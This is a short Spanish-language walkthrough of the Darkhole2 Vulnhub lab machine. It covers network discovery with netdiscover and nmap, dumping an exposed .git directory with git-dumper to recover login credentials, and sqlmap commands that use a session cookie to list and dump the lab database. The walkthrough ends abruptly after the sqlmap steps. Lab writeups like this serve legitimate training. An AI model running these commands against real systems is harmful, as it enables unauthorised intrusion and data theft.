# Darkhole2-Vulnhub-Writeup
Writeup de la maquina Darkhole2 de Vulnhub

El sistema se pondra a prueba en VirtualBox

## Escaneo de Red

En primer lugar, tenemos que obtener la dirección IP del objetivo

![uso del netdiscover](https://github.com/RamosAlicer/Darkhole2-Vulnhub-Writeup/blob/main/netdiscover.jpg)
~~~
netdiscover
~~~

Iniciando Nmap para avanzar en este proceso. Realizamos un escaneo agresivo (-A) para la enumeración de puertos abiertos y descubrimos la siguiente información de puertos:
~~~
nmap -A 192.168.40.133
~~~
De acuerdo con la salida de Nmap, tenemos:
Un servidor SSH que se ejecuta en el puerto 22
Un servicio HTTP ejecutándose (servidor Apache) en el puerto 80, así como una página http-git

## Enumerar el servidor web

Debido a que el servidor Apache está escuchando en el puerto 80, podemos verificarlo inmediatamente en el navegador.

Decidimos echar un vistazo a la página de inicio de sesión

Decidimos echar un vistazo a la página http-git que descubrimos previamente durante el escaneo agresivo de Nmap.

Usamos git-dumper
Es una herramienta para adquirir un repositorio git de un sitio web para obtener una mejor comprensión del conjunto de datos.
Simplemente usamos la función de clonación de git.
Creamos un directorio para nuestro respaldo .git
~~~
cd darkhole2
git clone https://github.com/arthaud/git-dumper.git
ls
cd git-dumper 
mkdir backup
~~~
Después de descargar la herramienta, intentamos ejecutarla con python .
Después de eso, accedimos al directorio de respaldo y el archivo de registro tenía tres entradas. Usando git, abrimos una de las entradas para progresar en este laboratorio.
Finalmente, descubrimos las credenciales de la página de inicio de sesión descubiertas antes durante el abuso de http.
~~~
python3 git_dumper.py http://192.168.40.133/.git/ backup 
cd backup
ls
git log
git diff  a4d900a8d85e8938d3601f3cef113ee293028e10
~~~
sqlmap -u "http://192.168.40.133/dashboard.php?id=1" --cookie="coiafrua9mc461a8436it7eiu4" --dbs –batch   //vemos las bases de datos

sqlmap -u "http://192.168.40.133/dashboard.php?id=1" --cookie="coiafrua9mc461a8436it7eiu4" -D darkhole_2 --dump-all --batch
date: "14/07/2023"
